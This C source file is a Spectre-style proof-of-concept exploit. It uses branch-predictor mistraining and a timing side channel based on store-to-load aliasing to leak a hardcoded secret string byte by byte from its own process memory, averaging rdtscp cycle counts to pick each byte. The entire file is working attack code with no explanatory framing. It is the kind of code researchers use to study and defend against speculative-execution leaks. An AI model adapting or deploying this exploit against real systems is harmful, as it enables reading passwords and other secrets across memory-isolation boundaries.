/* Compile with: gcc -O0 -std=gnu99 -o spectre_avg spectre_avg.c */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h>
#pragma optimize("gt",on)
#else
#include <x86intrin.h>
#endif

unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
uint8_t unused2[64];
uint8_t array2[256 * 512];

/* Buffer to create the Store-to-Load conflict */
uint8_t dummy_buffer[0x3000]; 

char * secret = "The password is rootkea";
uint8_t temp = 0;

void victim_function(size_t x) {
  if (x < array1_size) {
    temp &= array2[array1[x] * 512];
  }
}

void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
  uint64_t time_sums[256]; /* Store TOTAL cycles */
  int sample_counts[256];  /* Store how many valid samples we took */
  
  int tries, i, j, k, mix_k;
  unsigned int junk = 0;
  size_t training_x, x;
  register uint64_t time1, time2, diff;
  volatile uint8_t * alias_addr;

  for (i = 0; i < 256; i++) {
      time_sums[i] = 0;
      sample_counts[i] = 0;
  }

  /* OUTER LOOP: Test every possible byte (0-255) */
  for (k = 0; k < 256; k++) {
    mix_k = ((k * 167) + 13) & 255;

    /* CALCULATE ALIAS ADDRESS */
    size_t target_offset = ((size_t) &array2[mix_k * 512]) & 0xFFF;
    alias_addr = &dummy_buffer[0];
    while ((((size_t)alias_addr) & 0xFFF) != target_offset) {
        alias_addr++;
    }

    /* TRIALS LOOP */
    for (tries = 0; tries < 999; tries++) {
      
      training_x = tries % array1_size;
      
      /* INNER LOOP: 30 iterations */
      for (j = 29; j >= 0; j--) {
        _mm_clflush(&array1_size); 
        for (volatile int z = 0; z < 100; z++) {} 

        /* Bitwise select malicious vs training index */
        x = ((j % 6) - 1) & ~0xFFFF;
        x = (x | (x >> 16));
        x = training_x ^ (x & (malicious_x ^ training_x));
        
        /* MEASURE EVERY 6th RUN */
        if ((j % 6) == 0) {
            /* 1. Prime Store Buffer */
            *alias_addr = 0xAA; 
            
            /* 2. Measure */
            time1 = __rdtscp(&junk);
            victim_function(x);
            time2 = __rdtscp(&junk);
            diff = time2 - time1;

            /* 3. Aggregate Data (Filter Noise) */
            /* We only add the time if it's < 1000. 
               Anything > 1000 is likely an OS interrupt, not our stall. */
            if (diff < 1000) {
                time_sums[mix_k] += diff;
                sample_counts[mix_k]++;
            }

        } else {
            victim_function(x);
        }
      }
    }
  }

  /* CALCULATE AVERAGES AND FIND TOP 2 */
  double best_avg = 0.0, runner_up_avg = 0.0;
  int best_idx = -1, runner_up_idx = -1;

  for (i = 0; i < 256; i++) {
      double avg = 0.0;
      if (sample_counts[i] > 0) {
          avg = (double)time_sums[i] / sample_counts[i];
      }

      if (avg > best_avg) {
          runner_up_avg = best_avg;
          runner_up_idx = best_idx;
          best_avg = avg;
          best_idx = i;
      } else if (avg > runner_up_avg) {
          runner_up_avg = avg;
          runner_up_idx = i;
      }
  }

  value[0] = (uint8_t) best_idx;
  score[0] = (int)best_avg; /* Return average cycles as score */
  value[1] = (uint8_t) runner_up_idx;
  score[1] = (int)runner_up_avg;
}

int main(int argc, const char * * argv) {
  size_t malicious_x = (size_t)(secret - (char * ) array1); 
  int i, score[2], len = 23;
  uint8_t value[2];

  for (i = 0; i < sizeof(array2); i++) array2[i] = 1; 

  printf("Reading %d bytes (STLF - Average Latency Approach)...\n", len);
  while (--len >= 0) {
    printf("Reading %p... ", (void * ) malicious_x);
    readMemoryByte(malicious_x++, value, score);
    
    /* Success if best average is notably higher than runner up (e.g. +5 cycles) */
    printf("%s: ", (score[0] > score[1] + 5 ? "Success" : "Unclear"));
    
    printf("0x%02X='%c' (Avg: %d cyc) ", value[0],
      (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
      
    if (score[1] > 0)
      printf("(2nd: 0x%02X Avg: %d cyc)", value[1], score[1]);
    printf("\n");
  }
  return (0);
}